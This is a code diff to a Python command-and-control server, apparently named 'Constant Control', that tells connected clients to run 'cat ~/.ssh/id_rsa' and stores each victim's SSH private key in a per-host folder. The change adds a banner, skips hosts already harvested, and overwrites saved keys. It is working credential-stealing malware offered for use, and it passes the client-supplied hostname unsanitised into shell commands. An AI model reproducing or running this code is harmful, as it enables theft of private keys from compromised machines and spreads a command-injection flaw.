@@ -22,6 +22,17 @@ server_sock.bind((SERVER_ADDR, SERVER_PORT))
 
 #Start server and listen for new connections
 def startServer():
+    asciiArt = '''
+ _____                 _              _     _____             _             _ 
+/  __ \               | |            | |   /  __ \           | |           | |
+| /  \/ ___  _ __  ___| |_ __ _ _ __ | |_  | /  \/ ___  _ __ | |_ _ __ ___ | |
+| |    / _ \| '_ \/ __| __/ _` | '_ \| __| | |    / _ \| '_ \| __| '__/ _ \| |
+| \__/\ (_) | | | \__ \ || (_| | | | | |_  | \__/\ (_) | | | | |_| | | (_) | |
+ \____/\___/|_| |_|___/\__\__,_|_| |_|\__|  \____/\___/|_| |_|\__|_|  \___/|_|
+                                                                              
+                                                                              
+    '''
+    print(asciiArt)
     server_sock.listen(5)
     print()
     print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
@@ -38,6 +49,10 @@ def startServer():
             try:
                 client_sock.send("hostname".encode())
                 hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
+                if os.path.exists(f"{os.path.expanduser('~')}/client_keys/{hostName}"):
+                    print("Private key exists for: " + hostName)
+                    print("\n>",end="")
+                    return
                 try:
                     subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
                 except:
@@ -45,7 +60,7 @@ def startServer():
                     subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
                 client_sock.send("cat ~/.ssh/id_rsa".encode())
                 subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
-                with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","a") as file:
+                with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","w") as file:
                     file.write(client_sock.recv(BUFFER_SIZE).decode())
                     print(f"Private key copied for: {hostName}")
                 print("\n>",end="")
